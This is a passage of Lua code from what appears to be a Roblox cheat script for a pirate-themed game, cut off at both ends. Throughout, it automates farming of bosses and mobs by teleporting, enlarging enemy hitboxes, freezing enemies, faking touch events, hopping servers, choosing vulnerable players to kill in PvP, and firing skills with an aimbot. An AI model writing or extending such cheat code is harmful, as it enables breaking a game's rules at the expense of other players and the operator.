                                elseif game.Workspace.Enemies:FindFirstChild("Arctic Warrior") or game.Workspace.Enemies:FindFirstChild("Snow Lurker") then
                                    target = getClosest({"Arctic Warrior", "Snow Lurker"})
                                    if target then
                                        v = target
                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = true
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    end
                                else
                                    toPoint(CFrame.new(5733.30615234375, 28.366647720336914, -6400.83837890625))
                                end
                            end
                        else
                            firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.IceCastle.RengokuChest.Detection, 0)
                            wait()
                            firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.IceCastle.RengokuChest.Detection, 1)
                        end
                    end
                end)
            end
        end)
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Kill Darkbeard"] and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Darkbeard") then
                            v = game.Workspace.Enemies:FindFirstChild("Darkbeard")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not getgenv().EuphoriaSettings["Auto Kill Darkbeard"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Darkbeard") then
                            v = game.ReplicatedStorage:FindFirstChild("Darkbeard")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            useNearestEntrance(CFrame.new(3722.79785, 130.531006, -3403.83496, -0.789356351, 6.58137063e-34, -0.613935292, 1.45974817e-33, 1, -8.04847758e-34, 0.613935292, -1.53150264e-33, -0.789356351))
                            toTarget(CFrame.new(3722.79785, 130.531006, -3403.83496, -0.789356351, 6.58137063e-34, -0.613935292, 1.45974817e-33, 1, -8.04847758e-34, 0.613935292, -1.53150264e-33, -0.789356351))
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if FarmEctoplasm and second_sea then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name == "Ship Deckhand" or v.Name == "Ship Steward" or v.Name == "Ship Officer" or v.Name == "Ship Engineer" then
                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        repeat task.wait()
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not FarmEctoplasm or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            end
                        else
                            useNearestEntrance(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                            toPoint(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                        end
                    end
                end)
            end
        end)
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Ghoul Race"] and second_sea then
                        if LP.Data.Race.Value ~= "Ghoul" then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "BuyCheck", 4)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Change", 4)
                            if not isItemInEquip("Hellfire Torch") then
                                if game.Workspace.Enemies:FindFirstChild("Cursed Captain") then
                                    v = game.Workspace.Enemies:FindFirstChild("Cursed Captain")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health <= 0 then 
                                            toTarget(LP.Character.HumanoidRootPart.CFrame)
                                        else
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                MonName = v.Name
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                elseif game.ReplicatedStorage:FindFirstChild("Cursed Captain") then
                                    v = game.ReplicatedStorage:FindFirstChild("Cursed Captain")
                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    wait(2)
                                else
                                    if GetMaterial("Ectoplasm") < 100 then
                                        if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") then
                                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                                if v.Name == "Ship Deckhand" or v.Name == "Ship Steward" or v.Name == "Ship Officer" or v.Name == "Ship Engineer" then
                                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                        repeat task.wait()
                                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                            v.HumanoidRootPart.CanCollide = false
                                                            v.Humanoid.WalkSpeed = 0
                                                            v.Head.CanCollide = false
                                                            BringMobFarm = true
                                                            PosMon = v.HumanoidRootPart.CFrame
                                                            EquipWeapon(_G.SelectWeapon)
                                                            v.HumanoidRootPart.Transparency = 1
                                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        until not getgenv().EuphoriaSettings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                                    end
                                                end
                                            end
                                        else
                                            useNearestEntrance(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                            toPoint(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                        end
                                    else
                                        if getgenv().EuphoriaSettings["Auto Ghoul Race Hop"] and not _G.HopLowestActivated then 
                                            HopToLowestServer() 
                                        end
                                    end
                                end
                            elseif GetMaterial("Ectoplasm") < 100 then
                                if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") then
                                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                        if v.Name == "Ship Deckhand" or v.Name == "Ship Steward" or v.Name == "Ship Officer" or v.Name == "Ship Engineer" then
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat task.wait()
                                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = v.HumanoidRootPart.CFrame
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                until not getgenv().EuphoriaSettings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                            end
                                        end
                                    end
                                else
                                    useNearestEntrance(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                    toPoint(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                end
                            else
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "BuyCheck", 4)
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 4)
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Change", 4)
                            end
                        end
                    end
                end)
            end
        end)
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Factory"] and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Core") then
                            v = game.Workspace.Enemies:FindFirstChild("Core")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().EuphoriaSettings["Auto Factory"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Core") then
                            v = game.ReplicatedStorage:FindFirstChild("Core")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if getgenv().EuphoriaSettings["Auto Factory Hop"] then
                                HopServer()
                            end
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Swan Glasses"] then
                        AutoDonSwan = true
                    else
                        AutoDonSwan = false
                    end
                    if getgenv().EuphoriaSettings["Swan Glasses Hop"] then
                        AutoDonSwanHop = true
                    else
                        AutoDonSwanHop = false
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if (AutoDonSwan or AutoSea3DonSwan) and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Don Swan") then
                            v = game.Workspace.Enemies:FindFirstChild("Don Swan")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not (AutoDonSwan or AutoSea3DonSwan) or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Don Swan") then
                            v = game.ReplicatedStorage:FindFirstChild("Don Swan")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if (AutoSea3DonSwanHop or AutoDonSwanHop) then
                                if getDistance(CFrame.new(2291.04883, 73.925766, 834.2948, 0.998714685, 1.06858053e-07, -0.0506853238, -1.06115984e-07, 1, 1.73316987e-08, 0.0506853238, -1.19308989e-08, 0.998714685)) < 40 then
                                    HopServer()
                                else
                                    toTarget(CFrame.new(2291.04883, 73.925766, 834.2948, 0.998714685, 1.06858053e-07, -0.0506853238, -1.06115984e-07, 1, 1.73316987e-08, 0.0506853238, -1.19308989e-08, 0.998714685))
                                end
                            else
                                toTarget(CFrame.new(2291.04883, 73.925766, 834.2948, 0.998714685, 1.06858053e-07, -0.0506853238, -1.06115984e-07, 1, 1.73316987e-08, 0.0506853238, -1.19308989e-08, 0.998714685))
                            end
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if (FarmWaterKey or FarmWaterKeyGH) and not isItemInEquip("Water Key") and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Tide Keeper") then
                            v = game.Workspace.Enemies:FindFirstChild("Tide Keeper")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        MonName = v.Name
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not (FarmWaterKeyGH or FarmWaterKey) or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Tide Keeper") then
                            v = game.ReplicatedStorage:FindFirstChild("Tide Keeper")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if (FarmWaterKeyHop or FarmWaterKeyGH) and not isItemInEquip("Water Key") then 
                                HopServer()
                            end
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if (FarmLibraryKey or FarmLibraryKeyGH) and not isItemInEquip("Library Key") and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral") then
                            v = game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        MonName = v.Name
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not getgenv().EuphoriaSettings["Farm Water Key"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Awakened Ice Admiral") then
                            v = game.ReplicatedStorage:FindFirstChild("Awakened Ice Admiral")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if (FarmLibraryKeyGH or FarmLibraryKeyHop) and not isItemInEquip("Library Key") then 
                                HopServer()
                            end
                        end
                    else
                        if isItemInEquip("Library Key") then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("OpenLibrary")
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Gravity Cane"] and not isWeaponInInventory("Gravity Cane") and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Fajita") then
                            v = game.Workspace.Enemies:FindFirstChild("Fajita")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().EuphoriaSettings["Gravity Cane"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Fajita") then
                            v = game.ReplicatedStorage:FindFirstChild("Fajita")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if getgenv().EuphoriaSettings["Gravity Cane Hop"] then 
                                HopServer()
                            end
                        end
                    end
                end)
            end
        end)
        
        function useNearestEntrance(targetCFrame)
            
            local entrancesFirstSea = {Vector3.new(61164.19921875, 7.326029300689697, 1856.9254150390625), Vector3.new(-4607.82275390625, 874.3905029296875, -1667.556884765625), Vector3.new(-7894.61767578125, 5547.1416015625, -380.29119873046875)}
            local entrancesSecondSea = {Vector3.new(-287.952209, 306.130615, 605.197021), Vector3.new(-6498.72119, 83.1870193, -134.912308), Vector3.new(917.5881958007812, 125.08329772949219, 32863.19921875), Vector3.new(2282.219970703125, 34.56594467163086, 885.0680541992188)}
            local entrancesThirdSea = {Vector3.new(-5058.77490234375, 314.5155029296875, -3155.88330078125), Vector3.new(5756.83740234375, 610.4240112304688, -253.9253692626953), Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125), Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586), Vector3.new(-11993.580078125, 334.7812805175781, -8844.1826171875), Vector3.new(5314.58203125, 25.419387817382812, -125.94227600097656)}
            if first_sea then
                entrances = entrancesFirstSea
            end
            if second_sea then
                entrances = entrancesSecondSea
            end
            if third_sea then
                entrances = entrancesThirdSea
            end
            local playerToTargetDistance = (targetCFrame.Position - LP.Character.HumanoidRootPart.CFrame.Position).Magnitude
            local distance = math.huge
            local needEntrance = Vector3.new(0,0,0)
            for i, entrance in pairs(entrances) do
                entranceToTargetDistance = (entrance - targetCFrame.Position).Magnitude
                if entranceToTargetDistance < playerToTargetDistance and entranceToTargetDistance < distance then
                    distance = entranceToTargetDistance
                    needEntrance = entrance
                end
            end
            if needEntrance ~= Vector3.new(0,0,0) then 
                RequestEntrance(needEntrance)
                return true
            else 
                return false 
            end
            return false
        end
        
        function StopTween()
            NoClip = false
            StoppedTween = true
            toTarget(LP.Character.HumanoidRootPart.CFrame)
        end

        function GetMaterial(name)
            if PlayerData.Materials[name] then
                return PlayerData.Materials[name].Count
            else
                return 0
            end
        end

        function CanIKillThisShit(target)
            if target.Backpack:FindFirstChild("Buddha-Buddha") or target.Backpack:FindFirstChild("Dough-Dough") or target.Backpack:FindFirstChild("Kitsune-Kitsune") then
                return false
            end
            if target.Data.Level.Value < 21 then
                return false
            end
            if target.Character.Health > LP.Data.Stats.Melee.Level.Value * 8 then
                return false
            end
            if target.Character:FindFirstChild("HumanoidRootPart") and getDistance(target.Character.HumanoidRootPart.CFrame) < 100 and LP.PlayerGui.Main.PvpDisabled.Visible and string.find(LP.PlayerGui.Main.PvpDisabled.Text, "Safe Zone") then
                return false
            end
            return true
        end

        function GetAvailableSkills(checkSkills)
            local skills
            local skill
            local tool
            local needLevel
            skills = {}
            if LP.Character:FindFirstChildOfClass("Tool") then
                tool = LP.Character:FindFirstChildOfClass("Tool")
                level = tool.Level.Value
                skill = "Z"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "X"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "C"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "V"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "F"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                if checkSkills then
                    skillsNew = {}
                    for _1,skillAv in ipairs(skills) do
                        for _2,skillCheck in ipairs(checkSkills) do
                            if skillAv == skillCheck then
                                table.insert(skillsNew, skillAv)
                            end
                        end
                    end
                    return skillsNew
                else
                    return skills
                end
            else
                return {}
            end
        end
        
        function AttackSkill(SkillTarget, hitboxPos)
            local Tool = LP.Character:FindFirstChildOfClass("Tool")
            if Tool then
                if SkillTarget then              
                    local ToolName = LP.Character:FindFirstChildOfClass("Tool").Name
                    local ToolTip = LP.Character:FindFirstChildOfClass("Tool").ToolTip
                    if ToolName == "Dragon-Dragon" then
                        currSkill = GetAvailableSkills({"Z", "C"})[1]
                    elseif ToolName == "Kitsune-Kitsune" then
                        currSkill = GetAvailableSkills({"Z", "C", "X"})[1]
                    elseif ToolName == "Portal-Portal" then
                        currSkill = GetAvailableSkills({"Z", "X"})[1]
                    elseif ToolName == "Leopard-Leopard" then
                        currSkill = GetAvailableSkills({"Z", "X", "C"})[1]
                    else
                        currSkill = GetAvailableSkills({"Z", "X", "C", "V"})[1]
                    end
                    if currSkill then
                        if not hitboxPos then
                            aimPos = nil
                            if SkillTarget:FindFirstChild("AttackSeat") then
                                aimPos = SkillTarget.AttackSeat.CFrame.Position
                            elseif SkillTarget:FindFirstChild("HumanoidRootPart") then
                                aimPos = SkillTarget.HumanoidRootPart.Position
                            elseif SkillTarget:FindFirstChild("Character") and SkillTarget:FindFirstChild("Character"):FindFirstChild("HumanoidRootPart") then
                                aimPos = SkillTarget.Character.HumanoidRootPart.Position
                            end
                        else
                            aimPos = hitboxPos
                        end
                        _G.AimbotPos = aimPos
                        local Target = Tool:FindFirstChild("RemoteFunction")
                        if Target then
                            Target:InvokeServer(currSkill)
                        end
                        game:service('VirtualInputManager'):SendKeyEvent(true, currSkill, false, game)
                        wait(0.05)
